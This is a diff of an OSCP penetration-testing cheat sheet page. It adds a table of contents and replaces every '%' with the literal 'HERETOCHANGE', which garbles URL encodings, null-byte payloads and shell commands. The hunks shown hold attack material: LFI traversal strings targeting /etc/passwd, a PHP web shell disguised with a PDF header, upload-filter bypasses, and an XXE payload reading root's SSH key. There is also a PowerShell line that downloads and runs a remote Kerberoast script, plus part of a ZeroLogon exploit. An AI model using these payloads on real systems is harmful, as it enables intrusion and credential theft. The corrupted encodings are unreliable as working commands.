@@ -4,9 +4,166 @@ date: 2023-10-16T13:29:42+02:00
 url: "/infos/oscp-cheatsheet"
 ---
 
-## OSCP Cheat Sheet
+# OSCP Cheat Sheet
 Commands, Payloads and Resources for the OffSec Certified Professional Certification (OSCP).
 
+## Table of Contents
+
+- [Basics](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#basics)
+- [Information Gathering](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#information-gathering)
+- [Vulnerability Analysis](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#vulnerability-analysis)
+- [Web Application Analysis](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#web-application-analysis)
+- [Password Attacks](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#password-attacks)
+- [Reverse Engineering](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#reverse-engineering)
+- [Exploitation Tools](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exploitation-tools)
+- [Post Exploitation](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#post-exploitation)
+- [Exploit Databases](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exploit-databases)
+- [CVEs](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cves)
+- [Payloads](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#payloads)
+- [Wordlists](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#wordlists)
+- [Social Media Resources](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#social-media-resources)
+- [Commands](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#commands)
+	- [Basics](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#basics-1)
+		- [curl](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#curl)
+		- [Chisel](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#chisel)
+		- [File Transfer](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#file-transfer)
+  		- [FTP](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ftp)
+		- [Kerberos](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#kerberos)
+		- [Ligolo-ng](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ligolo-ng)
+		- [Linux](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#linux)
+		- [Microsoft Windows](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#microsoft-windows)
+		- [PHP Webserver](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#php-webserver)
+		- [Ping](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ping)
+		- [Python Webserver](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#python-webserver)
+		- [RDP](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#rdp)
+		- [showmount](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#showmount)
+		- [smbclient](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#smbclient)
+		- [socat](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#socat)
+		- [SSH](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ssh)
+		- [Time and Date](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#time-and-date)
+		- [Tmux](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#tmux)
+		- [Upgrading Shells](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#upgrading-shells)
+		- [VirtualBox](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#virtualbox)
+		- [virtualenv](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#virtualenv)
+	- [Information Gathering](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#information-gathering-1)
+		- [memcached](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#memcached)
+		- [NetBIOS](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#netbios)
+		- [Nmap](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#nmap)
+		- [Port Scanning](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#port-scanning)
+		- [snmpwalk](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#snmpwalk)
+	- [Web Application Analysis](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#web-application-analysis-1)
+		- [Burp Suite](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#burp-suite)
+  		- [cadaver](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cadaver)
+		- [Cross-Site Scripting (XSS)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cross-site-scripting-xss)
+		- [ffuf](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ffuf)
+		- [Gobuster](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#gobuster)
+		- [GitTools](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#gittools)
+		- [Local File Inclusion (LFI)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#local-file-inclusion-lfi)
+		- [PDF PHP Inclusion](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#pdf-php-inclusion)
+		- [PHP Upload Filter Bypasses](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#php-upload-filter-bypasses)
+		- [PHP Filter Chain Generator](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#php-filter-chain-generator)
+		- [PHP Generic Gadget Chains (PHPGGC)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#php-generic-gadget-chains-phpggc)
+		- [Server-Side Request Forgery (SSRF)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#server-side-request-forgery-ssrf)
+		- [Server-Side Template Injection (SSTI)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#server-side-template-injection-ssti)
+		- [Upload Vulnerabilities](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#upload-vulnerabilities)
+		- [wfuzz](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#wfuzz)
+		- [WPScan](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#wpscan)
+		- [XML External Entity (XXE)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#xml-external-entity-xxe)
+	- [Database Analysis](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#database-analysis)
+		- [MongoDB](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mongodb)
+		- [MSSQL](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mssql)
+		- [MySQL](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mysql)
+		- [NoSQL Injection](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#nosql-injection)
+		- [PostgreSQL](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#postgresql)
+		- [Redis](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#redis)
+		- [sqlcmd](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sqlcmd)
+		- [SQL Injection](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sql-injection)
+		- [SQL Truncation Attack](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sql-truncation-attack)
+		- [sqlite3](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sqlite3)
+		- [sqsh](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sqsh)
+	- [Password Attacks](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#password-attacks-1)
+		- [CrackMapExec](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#crackmapexec)
+		- [fcrack](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#fcrack)
+		- [hashcat](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#hashcat)
+		- [Hydra](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#hydra)
+		- [John](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#john)
+		- [Kerbrute](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#kerbrute)
+		- [LaZagne](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#lazagne)
+		- [mimikatz](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mimikatz)
+		- [pypykatz](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#pypykatz)
+	- [Exploitation Tools](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exploitation-tools-1)
+		- [ImageTragick](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#imagetragick)
+		- [MSL / Polyglot Attack](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#msl--polyglot-attack)
+		- [Metasploit](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#metasploit)
+	- [Post Exploitation](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#post-exploitation-1)
+		- [ADCSTemplate](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#adcstemplate)
+		- [BloodHound](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#bloodhound)
+		- [BloodHound Python](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#bloodhound-python)
+  		- [bloodyAD](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#bloodyAD)
+		- [Certify](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#certify)
+		- [Certipy](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#certipy)
+		- [enum4linux-ng](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#enum4linux-ng)
+		- [Evil-WinRM](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#evil-winrm)
+		- [Impacket](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#impacket-1)
+		- [JAWS](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#jaws)
+		- [Kerberos](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#kerberos-1)
+		- [ldapsearch](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ldapsearch)
+		- [Linux](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#linux-1)
+		- [Microsoft Windows](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#microsoft-windows-1)
+		- [PassTheCert](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#passthecert)
+		- [PKINITtools](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#pkinittools)
+		- [Port Scanning](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#port-scanning)
+		- [powercat](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#powercat)
+		- [Powermad](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#powermad)
+		- [PowerShell](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#powershell)
+		- [pwncat](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#pwncat)
+		- [rpcclient](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#rpcclient)
+		- [Rubeus](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#rubeus)
+		- [RunasCs](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#runascs)
+		- [smbpasswd](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#smbpasswd)
+		- [winexe](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#winexe)
+	- [CVE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve)
+		- [CVE-2014-6271: Shellshock RCE PoC](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2014-6271-shellshock-rce-poc)
+		- [CVE-2016-1531: exim LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2016-1531-exim-lpe)
+		- [CVE-2019-14287: Sudo Bypass](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2019-14287-sudo-bypass)
+		- [CVE-2020-1472: ZeroLogon PE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2020-1472-zerologon-pe)
+		- [CVE-2021–3156: Sudo / sudoedit LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2021-3156-sudo--sudoedit-lpe)
+		- [CVE-2021-44228: Log4Shell RCE (0-day)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2021-44228-log4shell-rce-0-day)
+		- [CVE-2022-0847: Dirty Pipe LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2022-0847-dirty-pipe-lpe)
+		- [CVE-2022-22963: Spring4Shell RCE (0-day)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2022-22963-spring4shell-rce-0-day)
+		- [CVE-2022-30190: MS-MSDT Follina RCE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2022-30190-ms-msdt-follina-rce)
+		- [CVE-2022-31214: Firejail LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2022-31214-firejail-lpe)
+		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
+		- [CVE-2023-22809: Sudo Bypass](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-22809-sudo-bypass)
+		- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation)
+		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
+  		- [CVE-2023-4911: Looney Tunables LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#cve-2023-4911-looney-tunables-lpe)
+  		- [GodPotato LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#godpotato-lpe)
+		- [Juicy Potato LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#juicy-potato-lpe)
+  		- [JuicyPotatoNG LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#juicypotatong-lpe)
+		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
+  		- [PrintSpoofer LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#printspoofer-lpe)
+		- [SharpEfsPotato LPE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#sharpefspotato-lpe)
+		- [Shocker Container Escape](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#shocker-container-escape)
+	- [Payloads](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#payloads-1)
+		- [Donut](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#donut)
+		- [Exiftool](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exiftool)
+		- [GhostScript](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ghostscript)
+		- [nishang](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#nishang)
+		- [Reverse Shells](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#reverse-shells)
+		- [ScareCrow](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#scarecrow)
+		- [Shikata Ga Nai](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#shikata-ga-nai)
+		- [Web Shells](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#web-shells)
+		- [ysoserial](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#ysoserial)
+	- [Templates](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#templates)
+		- [ASPX Web Shell](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#aspx-web-shell)
+		- [Bad YAML](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#bad-yaml)
+		- [Exploit Skeleton Python Script](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#exploit-skeleton-python-script)
+		- [JSON POST Rrequest](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#json-post-request)
+		- [Python Pickle RCE](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#python-pickle-rce)
+		- [Python Redirect for SSRF](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#python-redirect-for-ssrf)
+		- [Python Web Request](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#python-web-request)
+		- [XML External Entity (XXE)](https://k4ndar3c.github.io/hugos1te/infos/oscp-cheatsheet/#xml-external-entity-xxe)
 
 ### Basics
 
@@ -248,7 +405,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
-| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
+| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPEHERETOCHANGE20viaHERETOCHANGE20StorSvc |
 | n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
 | n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
 | n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
@@ -289,7 +446,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 | phpgcc | https://github.com/ambionics/phpggc |
 | PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
 | PowerLine | https://github.com/fullmetalcache/powerline |
-| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows](https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')) |
+| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows](https://cyberchef.io/#recipe=Encode_text('UTF-16LEHERETOCHANGE20(1200)')To_Base64('A-Za-z0-9HERETOCHANGE2B/HERETOCHANGE3D')) |
 | Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
 | ScareCrow | https://github.com/optiv/ScareCrow |
 | Shikata Ga Nai | https://github.com/EgeBalci/sgn |
@@ -400,7 +557,7 @@ function __wget() {
     local mark=0
 
     if [ -z "${URL}" ]; then
-        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
+        printf "Usage: HERETOCHANGEs \"URL\" [e.g.: HERETOCHANGEs http://www.google.com/]" \
                "${FUNCNAME[0]}" "${FUNCNAME[0]}"
         return 1;
     fi
@@ -575,7 +732,7 @@ iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
 ##### vi
 
 ```c
-:w !sudo tee %    # save file with elevated privileges without exiting
+:w !sudo tee HERETOCHANGE    # save file with elevated privileges without exiting
 ```
 
 ##### Windows Command Formatting
@@ -636,8 +793,8 @@ smbclient -L \\<RHOST>\ -N
 smbclient -L //<RHOST>/ -N
 smbclient -L ////<RHOST>/ -N
 smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
-smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
-smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
+smbclient -L //<RHOST>// -U <USERNAME>HERETOCHANGE<PASSWORD>
+smbclient //<RHOST>/SYSVOL -U <USERNAME>HERETOCHANGE<PASSWORD>
 smbclient "\\\\<RHOST>\<SHARE>"
 smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 smbclient --no-pass //<RHOST>/<SHARE>
@@ -746,7 +903,7 @@ while [ 1 ]; do sudo ntpdate <RHOST>;done
 ```c
 ctrl b + w    # show windows
 ctrl + "      # split window horizontal
-ctrl + %      # split window vertical
+ctrl + HERETOCHANGE      # split window vertical
 ctrl + ,      # rename window
 ctrl + {      # flip window
 ctrl + }      # flip window
@@ -1092,13 +1249,13 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 ##### Until php 5.3
 
 ```c
-http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
+http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwdHERETOCHANGE00
 ```
 
 ##### Null Byte
 
 ```c
-%00
+HERETOCHANGE00
 0x00
 ```
 
@@ -1108,11 +1265,11 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ../
 ..\
 ..\/
-%2e%2e%2f
-%252e%252e%252f
-%c0%ae%c0%ae%c0%af
-%uff0e%uff0e%u2215
-%uff0e%uff0e%u2216
+HERETOCHANGE2eHERETOCHANGE2eHERETOCHANGE2f
+HERETOCHANGE252eHERETOCHANGE252eHERETOCHANGE252f
+HERETOCHANGEc0HERETOCHANGEaeHERETOCHANGEc0HERETOCHANGEaeHERETOCHANGEc0HERETOCHANGEaf
+HERETOCHANGEuff0eHERETOCHANGEuff0eHERETOCHANGEu2215
+HERETOCHANGEuff0eHERETOCHANGEuff0eHERETOCHANGEu2216
 ..././
 ...\.\
 ```
@@ -1121,9 +1278,9 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 
 > https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb
 
-> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/FileHERETOCHANGE20Inclusion
 
-> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
+> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/FileHERETOCHANGE20Inclusion#wrapper-phpfilter
 
 ```c
 url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
@@ -1139,12 +1296,12 @@ base64 -d <FILE>.php
 
 ```c
 Accept: ../../../../.././../../../../etc/passwd{{
-Accept: ../../../../.././../../../../etc/passwd{%0D
-Accept: ../../../../.././../../../../etc/passwd{%0A
-Accept: ../../../../.././../../../../etc/passwd{%00
-Accept: ../../../../.././../../../../etc/passwd{%0D{{
-Accept: ../../../../.././../../../../etc/passwd{%0A{{
-Accept: ../../../../.././../../../../etc/passwd{%00{{
+Accept: ../../../../.././../../../../etc/passwd{HERETOCHANGE0D
+Accept: ../../../../.././../../../../etc/passwd{HERETOCHANGE0A
+Accept: ../../../../.././../../../../etc/passwd{HERETOCHANGE00
+Accept: ../../../../.././../../../../etc/passwd{HERETOCHANGE0D{{
+Accept: ../../../../.././../../../../etc/passwd{HERETOCHANGE0A{{
+Accept: ../../../../.././../../../../etc/passwd{HERETOCHANGE00{{
 ```
 
 ##### Linux Files
@@ -1502,7 +1659,7 @@ C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 Create a file with a PDF header, which contains PHP code.
 
 ```c
-%PDF-1.4
+HERETOCHANGEPDF-1.4
 
 <?php
     system($_GET["cmd"]);
@@ -1510,7 +1667,7 @@ Create a file with a PDF header, which contains PHP code.
 ```
 
 ```c
-http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
+http://<RHOST>/index.php?page=uploads/<FILE>.pdfHERETOCHANGE00&cmd=whoami
 ```
 
 #### PHP Upload Filter Bypasses
@@ -1535,19 +1692,19 @@ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 .pgif
 .phtml
 .phtm
-.php%00.jpeg
+.phpHERETOCHANGE00.jpeg
 ```
 
 ```c
-<FILE>.php%20
-<FILE>.php%0d%0a.jpg
-<FILE>.php%0a
+<FILE>.phpHERETOCHANGE20
+<FILE>.phpHERETOCHANGE0dHERETOCHANGE0a.jpg
+<FILE>.phpHERETOCHANGE0a
 <FILE>.php.jpg
-<FILE>.php%00.gif
+<FILE>.phpHERETOCHANGE00.gif
 <FILE>.php\x00.gif
-<FILE>.php%00.png
+<FILE>.phpHERETOCHANGE00.png
 <FILE>.php\x00.png
-<FILE>.php%00.jpg
+<FILE>.phpHERETOCHANGE00.jpg
 <FILE>.php\x00.jpg
 mv <FILE>.jpg <FILE>.php\x00.jpg
 ```
@@ -1593,7 +1750,7 @@ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
 > https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
 
 ```c
-${{<%[%'"}}%\.
+${{<HERETOCHANGE[HERETOCHANGE'"}}HERETOCHANGE\.
 ```
 
 ##### Magic Payload
@@ -1733,7 +1890,7 @@ Content-Length: 136
 ```
 
 ```c
-username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
+username=HERETOCHANGE26usernameHERETOCHANGE3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
 ```
 
 ### Database Analysis
@@ -2868,8 +3025,8 @@ impacket-GetNPUsers <DOMAIN>/ -usersfile <FILE> -format john -outputfile <FILE>
 impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile <FILE>
 .\Rubeus.exe kerberoast /outfile:<FILE>
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
-Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
-Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII <FILE>
+Invoke-Kerberoast -OutputFormat hashcat | HERETOCHANGE { $_.Hash } | Out-File -Encoding ASCII <FILE>
+Invoke-Kerberoast -OutputFormat john | HERETOCHANGE { $_.Hash } | Out-File -Encoding ASCII <FILE>
 ```
 
 ##### Overpass The Hash/Pass The Key (PTK)
@@ -2928,7 +3085,7 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 grep default_ccache_name /etc/krb5.conf
 ```
 
-* If none return, default is FILE:/tmp/krb5cc_%{uid}
+* If none return, default is FILE:/tmp/krb5cc_HERETOCHANGE{uid}
 * In Case of File Tickets it is possible to Copy-Paste them to use them
 * In Case of being KEYRING Tickets, the Tool tickey can be used to get them
 * To dump User Tickets, if root, it is recommended to dump them all by injecting in other user processes
@@ -3553,7 +3710,7 @@ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 SET CONTEXT PERSISTENT NOWRITERSp
 add volume c: alias foobarp
 createp
-expose %foobar% z:p
+expose HERETOCHANGEfoobarHERETOCHANGE z:p
 ```
 
 ```c
@@ -3592,7 +3749,7 @@ set context persistentX
 begin backupX
 add volume C: alias cdriveX
 createX
-expose %cdrive% E:X
+expose HERETOCHANGEcdriveHERETOCHANGE E:X
 end backupX
 ```
  
@@ -3682,7 +3839,7 @@ findstr /si password *.xml *.ini *.txt
 ###### PowerShell History
 
 ```c
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type HERETOCHANGEuserprofileHERETOCHANGE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 ###### Saved Windows Credentials
@@ -4057,8 +4214,8 @@ smbpasswd -U <RHOST>\<USERNAME> -r <RHOST>
 #### winexe
 
 ```c
-winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
-winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
+winexe -U '<USERNAMEHERETOCHANGEPASSWORD>' //<RHOST> cmd.exe
+winexe -U '<USERNAMEHERETOCHANGEPASSWORD>' --system //<RHOST> cmd.exe
 ```
 
 ### CVE
@@ -4160,7 +4317,7 @@ from binascii import hexlify, unhexlify
 from subprocess import check_call
 
 # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
-MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
+MAX_ATTEMPTS = 2000 # False negative chance: 0.04HERETOCHANGE
 
 def fail(msg):
   print(msg, file=sys.stderr)
